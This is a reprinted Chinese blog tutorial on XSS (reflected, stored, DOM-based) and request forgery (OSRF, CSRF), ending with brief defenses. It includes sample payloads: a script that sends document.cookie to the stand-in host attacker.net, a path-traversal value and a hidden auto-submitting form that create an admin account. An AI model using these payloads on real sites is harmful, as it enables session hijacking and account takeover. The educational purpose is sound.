---
title: 'XSS 和 CSRF 两种跨站攻击' 
date: 2019-01-30 2:30:23
hidden: true
slug: foopjzqqm5d
categories: [reprint]
---

{{< raw >}}

                    
<p>差不多刚开始接触前端的时候，经常能看到一些早几年入行大牛们的简历，几乎所有人都会在简历中带上这么一句话：具备基本的 Web 安全知识（XSS / CSRF）。显然这已经成为前端人员的必备知识。</p>
<p><span class="img-wrap"><img data-src="/img/bVGiYS?w=680&amp;h=447" src="https://static.alili.tech/img/bVGiYS?w=680&amp;h=447" alt="clipboard.png" title="clipboard.png" style="cursor: pointer; display: inline;"></span></p>
<p>非常怀念那个 SQL 注入还没有被普遍认可的年代，虽然这么多年过去了，SQL 注入并没有消失，仍然是最危险的漏洞。关于 SQL 注入的原理，可以看我之前写的文章<a href="http://yuren.space/blog/2016/10/01/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/" rel="nofollow noreferrer" target="_blank">SQL 注入详解</a>。今天是主题是 Web 安全的另外两大杀手，XSS 和 CSRF。</p>
<h2 id="articleHeader0">XSS 的分类</h2>
<p>XSS 漏洞有多种形式，分为三类，反射型、保存型和基于 DOM 的 XSS 攻击。这些漏洞的基本原理都是一样的，但是确定和利用漏洞方面又存在很大的差异，下面将对这三种漏洞详细介绍。</p>
<h3 id="articleHeader1">反射型 XSS 漏洞</h3>
<p>前面废话一大堆，还是没有说 XSS 漏洞到底是什么。如果一个 Web 程序可以动态的显示用户的错误消息，就有可能会产生反射型漏洞。</p>
<p>用户浏览网页时发送错误，向服务器请求 URL，比如<code>www.xxx.com/error.php?message=sorry,an error occurred</code>，然后服务器根据得到的 message，<strong>不进行过滤</strong>，复制到错误页面的模板中：<code>&lt;p&gt;sorry,an error occurred&lt;/p&gt;</code>，返回给用户。</p>
<p>这个漏洞有一个显著的特征，应用程序没有进行任何过滤或净化措施，就非常容易受到攻击。<code>www.xxx.com/error.php?message=&lt;script&gt;alert(1)&lt;/script&gt;</code>，当用户打开错误页面时，就会出现<code>&lt;p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;</code>，弹出一个消息框。</p>
<p>显然，攻击人员不会很傻的仅仅 alert 一些消息，在 IE 中，如果开启跨站点脚本检测可能无法弹出消息。通常 XSS 都会伴随着会话劫持，攻击者截获通过验证的用户的会话令牌。劫持用户的会话后，攻击者就可以访问该用户授权访问的所有数据和功能。</p>
<p>比如攻击者构造一个这样的 URL，message 信息如下</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="var i = new Image;
i.src=&quot;http://attacker.net/&quot;+document.cookie;" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs dart"><code><span class="hljs-keyword">var</span> i = <span class="hljs-keyword">new</span> Image;
i.src=<span class="hljs-string">"http://attacker.net/"</span>+<span class="hljs-built_in">document</span>.cookie;</code></pre>
<p>这样被攻击者通过访问这个恶意的 URL，就会把 cookie 发送给黑客，黑客截获 cookie，就能执行用户的任意操纵。下图是一个简易的流程图：</p>
<p><span class="img-wrap"><img data-src="/img/bVGiXL?w=471&amp;h=280" src="https://static.alili.tech/img/bVGiXL?w=471&amp;h=280" alt="clipboard.png" title="clipboard.png" style="cursor: pointer; display: inline;"></span></p>
<p>这个图还有一个重要的点没有标明出来，就是前提是受害者要先登录到 Bank.com 的网站上。</p>
<p>由于浏览器的同源策略，直接向 attacker.net 发送 document.cookie 是无法获得 www.xxx.com 的 cookie，因为浏览器会对不同源（域）的内容进行隔离，这就是该漏洞被称为跨站脚本的原因。</p>
<h3 id="articleHeader2">保存型 XSS 漏洞</h3>
<p>保存型跨站脚本也是比较常见的漏洞，脚本通常保存在后端数据库中，不经过滤就存储并且显示给用户，此时就会出现这种漏洞。</p>
<p>与反射型的流程不同的是，保存型需要向服务器提出至少两次请求，第一次将含有恶意代码的数据提交给服务器，服务器将数据保存，第二次是受害者想服务器提出访问含有恶意代码数据的页面，恶意代码执行。</p>
<p>与反射型不同的是，保存型不需要一个专门设计的 URL 来接收 cookie，只需要将含有恶意代码的页面发给用户，等待受害者访问即可。不过，也可用保存型的漏洞来获取用户 cookie 进行劫持。</p>
<p>还有一个不同点，反射型的漏洞，必须要等受害者登陆后，才能保证 cookie 的正常获得，而保存型的漏洞，受害者一般是先登录，然后访问改站点有危险的页面。</p>
<p>举一个例子，比如某社交论坛存在保存型的 XSS 漏洞，黑客将自己的个人信息一栏修改成恶意的 JS 代码，改代码实现两个功能，首先受害者加自己为好友，其次修改受害者的个人信息为该恶意代码。黑客把个人信息保存并提交给服务器，只需要等受害者访问自己的个人信息页面，浏览器就会执行该恶意脚本，于是可怕的“蠕虫”就开始了。</p>
<h3 id="articleHeader3">基于 DOM 的 XSS 漏洞</h3>
<p>前两种 XSS 漏洞，都表现一种特殊的模式，就是应用程序提取数据并返回给受害者，而基于 DOM 的 XSS 不具有这种特点，攻击者是借助于 JavaScript 来展开攻击的。</p>
<ol>
<li><p>用户请求一个经过专门设计的 URL，由攻击者提交，包括嵌入式的 JavaScript；</p></li>
<li><p>服务器的响应不包含任何攻击者的脚本，同时服务器也不会对 URL 进行检测；</p></li>
<li><p>当用户浏览这个响应时，脚本得以处理。</p></li>
</ol>
<p>与反射型漏洞类似，都是对 URL 进行特殊构造，不同的是，反射型是由服务器处理 URL，而 DOM 型是由 JavaScript 脚本来处理。还以刚才那个反射型为例子，假设应用程序返回的错误页面包含以下 JS 脚本：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<script>
  // www.xxx.com/error.php?message=sorry,an error occurred
  var url = document.location;
  var message = /message=(.+)$/.exec(url)[1];
  document.wirte(message);
  //或者
  document.getElementById(&quot;show&quot;).innerHTML = message;
</script>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-comment">// www.xxx.com/error.php?message=sorry,an error occurred</span>
  <span class="hljs-keyword">var</span> url = <span class="hljs-built_in">document</span>.location;
  <span class="hljs-keyword">var</span> message = <span class="hljs-regexp">/message=(.+)$/</span>.exec(url)[<span class="hljs-number">1</span>];
  <span class="hljs-built_in">document</span>.wirte(message);
  <span class="hljs-comment">//或者</span>
  <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"show"</span>).innerHTML = message;
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
<p>同样给受害者发送这样的链接 <code>www.xxx.com/error.php?message=&lt;script&gt;alert(1)&lt;/script&gt;</code>，也可以开展 XSS 漏洞攻击。基于 DOM 的漏洞不局限与 URL，还可以是页面某个 DOM 的内容，这和存储型的 XSS 又联系到一起。</p>
<p>这个时候就需要些 JS 的同学小心谨慎了，万一写出含有漏洞的代码，这锅得自己背。</p>
<h2 id="articleHeader4">请求伪造</h2>
<p>在 XSS 跨站攻击中，攻击者需要获得受害者的会话令牌，请求伪造也与会话劫持相关，但是攻击者不需要知道受害者的会话令牌，就能够行驶“受害者”的权利。请求伪造有两种，本站点请求伪造（OSRF）和跨站点请求伪造（CSRF），</p>
<h3 id="articleHeader5">OSRF</h3>
<p>OSRF 是一种利用保存型 XSS 漏洞的攻击载荷，如果在得知应用程序对 XSS 漏洞过滤的情况下，可以尝试 OSRF 攻击。</p>
<p>比如这是一个某站点 POST 请求，该站点过滤 XSS 攻击，</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="POST /submit.php
Host: xxx.com
Content-Length: ..

type=question&amp;name=ge&amp;message=mes" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs stylus"><code>POST /submit<span class="hljs-selector-class">.php</span>
Host: xxx<span class="hljs-selector-class">.com</span>
Content-Length: ..

type=question&amp;name=ge&amp;message=mes</code></pre>
<p>然后该信息将会被插入到如下的 HTML 中：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<tr>
  <td><img src=&quot;/images/question.jpg&quot;></td>
  <td>ge</td>
  <td>mes</td>
</tr>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/images/question.jpg"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>ge<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>mes<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></code></pre>
<p>这个漏洞很容易利用，直接用 type 的值来表示 jpg 的name，然后我们构造 type 的值等于下面的内容（这不就是利用路径来搞事吗），</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="../admin/newuser.php?username=test&amp;password=123&amp;role=admin#" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs dts"><code style="word-break: break-word; white-space: initial;">..<span class="hljs-meta-keyword">/admin/</span>newuser.php?username=test<span class="hljs-variable">&amp;password</span>=<span class="hljs-number">123</span><span class="hljs-variable">&amp;role</span>=admin<span class="hljs-meta">#</span></code></pre>
<p>使用上面的介绍，相对应的构造一个表单提交，创建一个管理员权限的用户，普通用户点击是不会成功的，因为权限不够，但是如果是管理员点击该链接的话，就会创建一个秘密账户，所以，即时对 URL 禁用了 JavaScript 脚本，还是可以通过 OSRF 攻击成功。</p>
<p>在攻击字符串的最后使用了 # ，是为了对 .jpg 进行屏蔽，也可以添加 &amp; 组成另一个参数。</p>
<p>以上便是一个简单的本站点请求伪造的例子。</p>
<h3 id="articleHeader6">CSRF</h3>
<p>跨站点请求伪造才是跨站伪造的重点内容，攻击者只需要创建一个看似无害的网站，致使受害者的浏览器直接向易受攻击的服务器提交一个请求，执行恶意代码。</p>
<p>仍然需要考虑同源策略，仍然以管理员创建新用户为例，</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="POST /newUser.php HTTP/1.1
Host: xxx.com
Cookie: SessionId=...
Content-Length: ..

name=ro&amp;userrole=admin&amp;password=123456&amp;confirmpassword=123456" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs http"><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/newUser.php</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: xxx.com
<span class="hljs-attribute">Cookie</span>: SessionId=...
<span class="hljs-attribute">Content-Length</span>: ..

<span class="dts">name=ro<span class="hljs-variable">&amp;userrole</span>=admin<span class="hljs-variable">&amp;password</span>=<span class="hljs-number">123456</span><span class="hljs-variable">&amp;confirmpassword</span>=<span class="hljs-number">123456</span></span></code></pre>
<p>黑客构造的网站会提交一个 form 表单，并想办法让 form 隐藏：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<<!DOCTYPE html>
<html><body>
  <form action=&quot;http://xxx.com/newUser.php&quot; method=&quot;POST&quot;>
    <input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;ro&quot;>
    <input type=&quot;hidden&quot; name=&quot;userrole&quot; value=&quot;admin&quot;>
    <input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;123456&quot;>
    <input type=&quot;hidden&quot; name=&quot;confirmpassword&quot; value=&quot;123456&quot;>
  </form>
</body></html>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs django"><code><span class="xml"><span class="hljs-tag">&lt;&lt;!<span class="hljs-attr">DOCTYPE</span> <span class="hljs-attr">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://xxx.com/newUser.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"name"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"ro"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"userrole"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"admin"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"confirmpassword"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre>
<p>当管理员已经登陆的情况下，访问这个恶意网站的时候，就会提交这段脚本，管理员都不知情。因为管理员已经登陆，无需考虑 Cookie 的问题，一个简单的 CSRF 如此。</p>
<h2 id="articleHeader7">总结</h2>
<p>其实攻击很简单，主要的还是如何防御，比如</p>
<ol>
<li><p>对一些关键字和特殊字符进行过滤或 URL、HTML 编码，"&lt;&gt;?"或"script，javascript"；</p></li>
<li><p>Cookie 防盗，在 Cookie 中防止放入用户名和密码，对 Cookie 信息进行 MD5 等算法进行多次散列存放，必要时还要对 ip 和 cookie 进行绑定，一旦检测异常，立马让用户重新登录；</p></li>
<li><p>严格控制 URL 访问，对于一些挂马的 ip 和域名，强制无法访问；</p></li>
<li><p>等等</p></li>
</ol>
<p>共勉。</p>
<h2 id="articleHeader8">参考</h2>
<blockquote><p><a href="http://blog.csdn.net/yefan2222/article/details/7091863" rel="nofollow noreferrer" target="_blank">跨站脚本攻击介绍</a><br><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/7.html" rel="nofollow noreferrer" target="_blank">那些年我们一起学 XSS</a><br><a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/" rel="nofollow noreferrer" target="_blank">总结 XSS 与 CSRF 两种跨站攻击</a><br>书籍：《黑客攻防技术宝典 Web实战篇》</p></blockquote>
<p>欢迎来我<a href="http://yuren.space" rel="nofollow noreferrer" target="_blank">博客</a>交流。</p>

                
{{< /raw >}}

# 版权声明
本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有，

本文仅用于学习、研究和交流目的。转载请注明出处、完整链接以及原作者。

原作者若认为本站侵犯了您的版权，请联系我们，我们会立即删除！

## 原文标题
XSS 和 CSRF 两种跨站攻击

## 原文链接
[https://segmentfault.com/a/1190000007660669](https://segmentfault.com/a/1190000007660669)

